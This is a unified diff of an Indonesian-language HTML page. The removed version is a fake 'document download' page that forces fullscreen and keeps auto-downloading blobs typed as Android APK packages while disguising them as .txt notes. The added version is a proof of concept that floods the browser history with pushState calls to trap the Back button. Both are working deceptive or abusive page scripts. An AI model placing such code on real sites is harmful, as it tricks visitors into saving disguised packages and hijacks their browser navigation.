@@ -2,214 +2,87 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Text Document Secure Dispatcher</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>History API Flooding Test</title>
 <style>
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
-body {
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  background: #f8fafc;
-  color: #334155;
-  padding: 20px;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
-}
-.panel {
-  background: #ffffff;
-  padding: 32px;
-  border-radius: 12px;
-  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-  max-width: 520px;
-  width: 100%;
-  border: 1px solid #e2e8f0;
-  text-align: center;
-}
-:fullscreen {
-  background: #0f172a !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-}
-:-webkit-full-screen {
-  background: #0f172a !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
-}
-h2 { 
-  margin-bottom: 8px; 
-  font-size: 20px;
-  color: #0f172a;
-}
-p { 
-  margin-bottom: 20px; 
-  line-height: 1.5; 
-  color: #64748b;
-  font-size: 14px;
-}
-button {
-  width: 100%;
-  padding: 14px;
-  cursor: pointer;
-  border: none;
-  border-radius: 8px;
-  background: #2563eb;
-  color: #ffffff;
-  font-weight: 600;
-  font-size: 15px;
-  box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
-  transition: background 0.2s;
-}
-button:hover { background: #1d4ed8; }
-#status {
-  margin-top: 16px;
-  font-weight: 500;
-  color: #0284c7;
-  padding: 12px;
-  background: #e0f2fe;
-  border-radius: 6px;
-  font-size: 13px;
-  border: 1px solid #bae6fd;
-}
-#downloads {
-  margin-top: 20px;
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
-  gap: 8px;
-  max-height: 180px;
-  overflow-y: auto;
-}
-#downloads a {
-  display: block;
-  padding: 8px;
-  background: #f1f5f9;
-  color: #0369a1;
-  text-decoration: none;
-  border-radius: 4px;
-  font-size: 11px;
-  font-family: monospace;
-  text-align: center;
-  border: 1px solid #cbd5e1;
-  word-break: break-all;
-}
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #0f172a;
+    color: #f8fafc;
+    padding: 40px;
+    text-align: center;
+  }
+  .card {
+    background: #1e293b;
+    padding: 32px;
+    border-radius: 12px;
+    max-width: 500px;
+    margin: 0 auto;
+    border: 1px solid #334155;
+  }
+  button {
+    background: #ef4444;
+    color: white;
+    border: none;
+    padding: 12px 24px;
+    font-size: 16px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    margin-top: 16px;
+  }
+  button:hover { background: #dc2626; }
+  #status {
+    margin-top: 20px;
+    font-family: monospace;
+    color: #38bdf8;
+    font-size: 14px;
+  }
 </style>
 </head>
-
 <body>
-<div class="panel" id="main-panel">
-<h2>Dokumen Catatan Sistem</h2>
-<p>Klik tombol di bawah untuk mengonfirmasi dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
 
-<button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
-
-<div id="status" role="status">Sistem siap.</div>
-<div id="downloads"></div>
+<div class="card">
+  <h2>History API Flooding PoC</h2>
+  <p>Klik tombol di bawah untuk membanjiri history stack menggunakan <code>history.pushState()</code> secara masif.</p>
+  <button id="flood-btn">Mulai History Flood</button>
+  <div id="status">Status: Siap diuji. (Perhatikan tombol Back browser setelah dimulai)</div>
 </div>
 
 <script>
 'use strict';
 
-const startBtn = document.getElementById("start-btn");
-const statusDiv = document.getElementById("status");
-const downloadsDiv = document.getElementById("downloads");
+const floodBtn = document.getElementById('flood-btn');
+const statusDiv = document.getElementById('status');
+let isFlooding = false;
 
-let activeUrls = [];
-let isProcessing = false;
-const MAX_URLS_TRACKED = 50;
+floodBtn.addEventListener('click', () => {
+  if (isFlooding) return;
+  isFlooding = true;
+  floodBtn.disabled = true;
+  floodBtn.style.opacity = '0.5';
 
-// Header biner APK (ZIP Signature: PK..)
-const b64Data = "UEsDBBQAAAAIAAAAIQ";
+  let count = 0;
+  statusDiv.textContent = 'Status: Membanjiri history stack...';
 
-const decodeBase64ToBytes = (b64) => {
-  const binary = atob(b64);
-  const len = binary.length;
-  const bytes = new Uint8Array(len);
-  for (let i = 0; i < len; i++) {
-    bytes[i] = binary.charCodeAt(i);
-  }
-  return bytes;
-};
-
-const prepareDisguisedBlobAsync = (i) => {
-  return new Promise((resolve) => {
-    queueMicrotask(() => {
-      try {
-        const bytesArr = decodeBase64ToBytes(b64Data);
-        // MIME type asli diatur sebagai paket APK, namun antarmuka menyamar sebagai teks
-        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
-        const url = URL.createObjectURL(blob);
-        resolve({ id: i, url: url, success: true });
-      } catch (err) {
-        resolve({ id: i, url: null, success: false });
+  // Memanggil pushState secara intensif dalam interval singkat
+  const interval = setInterval(() => {
+    try {
+      for (let i = 0; i < 500; i++) {
+        count++;
+        history.pushState({ floodIndex: count }, `Flood ${count}`, `#state-${count}`);
       }
-    });
-  });
-};
-
-const triggerInstantDownload = (fileData) => {
-  if (!fileData.success) return;
-
-  const link = document.createElement("a");
-  link.href = fileData.url;
-  // Menyamarkan ekstensi unduhan menjadi .txt pada atribut anchor
-  link.download = `laporan-catatan-${fileData.id}.txt`;
-  link.textContent = `Dokumen #${fileData.id} (.txt)`;
-  link.style.display = "none";
-  downloadsDiv.appendChild(link);
-  link.click();
-
-  if (downloadsDiv.children.length > 20) {
-    downloadsDiv.removeChild(downloadsDiv.firstChild);
-  }
-};
-
-const processLoop = async (counter) => {
-  if (!isProcessing) return;
-
-  const fileData = await prepareDisguisedBlobAsync(counter);
-  if (fileData.success) {
-    activeUrls.push(fileData.url);
-
-    if (activeUrls.length > MAX_URLS_TRACKED) {
-      const oldUrl = activeUrls.shift();
-      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
+      statusDiv.textContent = `Status: Berhasil memasukkan ${count} state ke history.`;
+    } catch (err) {
+      clearInterval(interval);
+      statusDiv.textContent = `Limit / Error tercapai: ${err.message}`;
+      isFlooding = false;
+      floodBtn.disabled = false;
+      floodBtn.style.opacity = '1';
     }
-
-    triggerInstantDownload(fileData);
-    statusDiv.textContent = `Mengunduh dokumen catatan ke-${counter}...`;
-  }
-
-  setTimeout(() => processLoop(counter + 1), 1200);
-};
-
-startBtn.addEventListener("click", () => {
-  if (isProcessing) return;
-
-  activeUrls.forEach(url => {
-    try { URL.revokeObjectURL(url); } catch (e) {}
-  });
-  activeUrls = [];
-  downloadsDiv.replaceChildren();
-
-  const root = document.documentElement;
-  try {
-    if (root.requestFullscreen) {
-      root.requestFullscreen().catch(() => {});
-    }
-  } catch (err) {}
-
-  isProcessing = true;
-  statusDiv.textContent = "Menyiapkan berkas unduhan...";
-  processLoop(1);
+  }, 50);
 });
 </script>
+
 </body>
 </html>
